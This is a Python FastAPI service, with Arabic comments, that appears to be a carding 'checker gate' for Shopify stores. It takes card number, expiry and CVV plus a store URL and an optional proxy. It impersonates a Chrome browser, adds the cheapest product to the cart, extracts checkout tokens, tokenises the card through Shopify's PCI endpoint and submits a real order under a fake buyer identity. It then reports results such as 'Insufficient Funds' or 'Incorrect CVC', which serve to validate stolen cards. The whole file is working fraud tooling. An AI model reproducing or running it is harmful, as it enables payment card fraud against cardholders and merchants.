from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import uuid
import random
import asyncio
from html import unescape

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn").replace("Timeout", "T-out").replace("timeout", "t-out")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_optimal_product(session, store_url):
    """محرك شامل يسحب المنتج الرخيص، وإن لم يجد يسحب الأرخص مطلقاً ولا يوقف العملية"""
    endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
    all_variants = []
    
    for ep in endpoints:
        try:
            res = await session.get(ep, headers={"Accept": "application/json"}, timeout=15)
            if res.status_code == 200:
                products = res.json().get('products', [])
                for prod in products:
                    for var in prod.get('variants', []):
                        if var.get('available'):
                            try:
                                p = float(var.get('price', 0))
                                if p > 10000: p = p / 100.0
                                if p > 0: all_variants.append((var.get('id'), p))
                            except: pass
        except: continue
        if all_variants: break

    # إذا وجدنا منتجات عبر API
    if all_variants:
        all_variants.sort(key=lambda x: x[1])
        # البحث عن منتج رخيص أولاً
        best_variant = all_variants[0]
        for vid, price in all_variants:
            if 0.1 <= price <= 150.0:
                best_variant = (vid, price)
                break
        return str(best_variant[0]), "{:.2f}".format(best_variant[1])

    # الخطة البديلة (Fallback): استخراج Product ID من HTML الموقع لو الـ API مغلق
    try:
        html_res = await session.get(store_url, timeout=15)
        matches = re.findall(r'variant[s]?["\']?\s*:\s*\[?.*?["\']?id["\']?\s*:\s*(\d+)', html_res.text, re.IGNORECASE)
        if matches:
            return str(matches[0]), "Unknown"
    except: pass

    return None, "-"

def extract_advanced_tokens(html, url):
    is_graphql = False
    session_token, classic_token, checkout_token = None, None, None

    ct_match = re.search(r'/checkouts/(?:cn|c|unstable|c/graphql)/([^/?]+)', url)
    if ct_match: checkout_token = ct_match.group(1)

    st_meta = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html)
    st_json = re.search(r'["\']?sessionToken["\']?\s*:\s*["\']([^"\']+)["\']', html)
    
    if st_meta:
        session_token = unescape(st_meta.group(1)).strip('"')
        is_graphql = True
    elif st_json:
        session_token = st_json.group(1)
        is_graphql = True

    patterns = [
        r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']',
        r'<meta\s+name=["\']csrf-token["\']\s+content=["\']([^"\']+)["\']'
    ]
    for p in patterns:
        match = re.search(p, html, re.IGNORECASE)
        if match:
            classic_token = unescape(match.group(1))
            break

    return is_graphql, session_token, classic_token, checkout_token

async def check_shopify_terminal(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify Terminal")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        scope_host = store_url.replace("https://", "").replace("http://", "")
        proxies = {"http": format_proxy(proxy), "https": format_proxy(proxy)} if proxy else None

        buyer = {
            "email": f"david.williams{random.randint(10000,99999)}@gmail.com", "first_name": "David", "last_name": "Williams",
            "address1": "123 Main Street", "city": "New York", "province": "NY", "zip": "10001", "country": "US", "phone": "2125551234"
        }

        async with AsyncSession(impersonate="chrome120", proxies=proxies, timeout=60, http_version=1) as session:
            
            # 1. سحب المنتج بالذكاء الشامل
            variant_id, price = await get_optimal_product(session, store_url)
            if not variant_id: return safe_response("Store has no accessible products", "-", "Shopify Terminal")

            # 2. الإضافة للسلة
            add_res = await session.post(f"{store_url}/cart/add.js", data={"id": variant_id, "quantity": "1"}, headers={"X-Requested-With": "XMLHttpRequest"})
            if add_res.status_code not in [200, 201]: return safe_response("Anti-Bot Blocked Cart Add", price, "Shopify Terminal")

            await asyncio.sleep(0.5)

            # 3. تخطي كلاودفلير وتوليد جلسة دفع
            chk_headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": f"{store_url}/cart",
                "Upgrade-Insecure-Requests": "1"
            }
            res_chk = await session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True, headers=chk_headers)
            html_chk = res_chk.text
            final_url = str(res_chk.url)

            if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
                return safe_response("Cloudflare WAF Blocked IP", price, "Shopify Terminal")
            
            if "/cart" in final_url and "/checkout" not in final_url:
                return safe_response("Cart Blocked (Item Removed by Site)", price, "Shopify Terminal")

            # 4. الرادار الجزيئي للتوكن
            is_graphql, session_token, classic_token, checkout_token = extract_advanced_tokens(html_chk, final_url)

            if not is_graphql and not classic_token:
                title = re.search(r'<title>([^<]+)</title>', html_chk)
                page_title = title.group(1).strip() if title else "Unknown"
                return safe_response(f"Token Extractor Failed ({page_title[:15]})", price, "Shopify Terminal")

            # 5. تشفير البطاقة
            pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
            res_pci = await session.post("https://checkout.pci.shopifyinc.com/sessions", json={"credit_card": {"number": cc, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}, headers=pci_headers)
            if res_pci.status_code != 200: return safe_response("Stripe PCI Blocked IP", price, "Shopify Terminal")
            card_session_id = res_pci.json().get("id")

            # =================================================================
            # المسار الأول: GraphQL Extensibility
            # =================================================================
            if is_graphql:
                if not checkout_token: checkout_token = "unknown"

                gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
                gql_headers = {'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"', 'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token}
                merch_id = str(uuid.uuid4())
                addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
                
                prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
                prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
                res_prop = await session.post(gql_url, json={"operationName": "Proposal", "query": prop_query, "variables": prop_vars}, headers=gql_headers)
                queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
                if not queue_token: return safe_response("GraphQL Negotiate Failed", price, "Shopify Terminal (GQL)")

                await asyncio.sleep(1)

                sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
                sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
                sub_vars = {"attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}", "input": {"sessionInput": {"sessionToken": session_token}, "queueToken": queue_token, "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}}}
                res_sub = await session.post(sub_url, json={"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}, headers=gql_headers)
                
                rtype = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('__typename')
                if rtype == 'SubmitRejected':
                    errs = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('errors', [])
                    msg = errs[0].get('localizedMessage', 'Rejected') if errs else 'System Rejected'
                    return safe_response(msg, price, "Shopify Terminal (GQL)")

                receipt_id = res_sub.json().get('data', {}).get('submitForCompletion', {}).get('receipt', {}).get('id')
                if not receipt_id: return safe_response("GraphQL Submit Failed", price, "Shopify Terminal (GQL)")

                poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
                poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}...on ActionRequiredReceipt{id}}}"""
                for _ in range(6):
                    res_poll = await session.post(poll_url, json={"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}, headers=gql_headers)
                    if res_poll.status_code == 200:
                        p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                        if p_type == 'ProcessedReceipt': return safe_response("Order completed 💎", price, "Shopify Terminal (GQL)")
                        elif p_type == 'FailedReceipt':
                            err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                            if "INSUFFICIENT" in err: return safe_response("Insufficient Funds", price, "Shopify Terminal (GQL)")
                            elif "CVC" in err: return safe_response("Incorrect CVC", price, "Shopify Terminal (GQL)")
                            elif "ZIP" in err or "ADDRESS" in err: return safe_response("ZIP Code Mismatch", price, "Shopify Terminal (GQL)")
                            elif "DO_NOT_HONOR" in err: return safe_response("Do Not Honor", price, "Shopify Terminal (GQL)")
                            return safe_response(f"Declined: {err}", price, "Shopify Terminal (GQL)")
                    await asyncio.sleep(1.5)
                return safe_response("Timeout waiting for Bank", price, "Shopify Terminal (GQL)")
            
            # =================================================================
            # المسار الثاني: Classic HTML
            # =================================================================
            else:
                addr_payload = {"_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method", "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"], "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"], "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]}
                res_addr = await session.post(final_url, data=addr_payload, allow_redirects=True)
                
                match2 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_addr.text)
                classic_token2 = unescape(match2.group(1)) if match2 else classic_token
                
                res_ship = await session.post(str(res_addr.url), data={"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}, allow_redirects=True)
                
                gate_match = re.search(r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']', res_ship.text)
                gateway_id = gate_match.group(1) if gate_match else "1"
                
                match3 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_ship.text)
                classic_token3 = unescape(match3.group(1)) if match3 else classic_token2

                pay_payload = {"_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "", "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"}
                res_pay = await session.post(str(res_ship.url), data=pay_payload, allow_redirects=True)
                res_text = res_pay.text.lower()
                
                if "thank you" in res_text or "order completed" in res_text: return safe_response("Order completed 💎", price, "Shopify Terminal (Classic)")
                elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Terminal (Classic)")
                elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Terminal (Classic)")
                elif "zip code" in res_text or "avs" in res_text: return safe_response("ZIP Code Mismatch", price, "Shopify Terminal (Classic)")
                elif "do not honor" in res_text: return safe_response("Do Not Honor", price, "Shopify Terminal (Classic)")
                else:
                    err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                    return safe_response(err.group(1).strip() if err else "Declined / Gate Blocked", price, "Shopify Terminal (Classic)")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify Terminal")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    return JSONResponse(content=await check_shopify_terminal(cc, url, proxy))
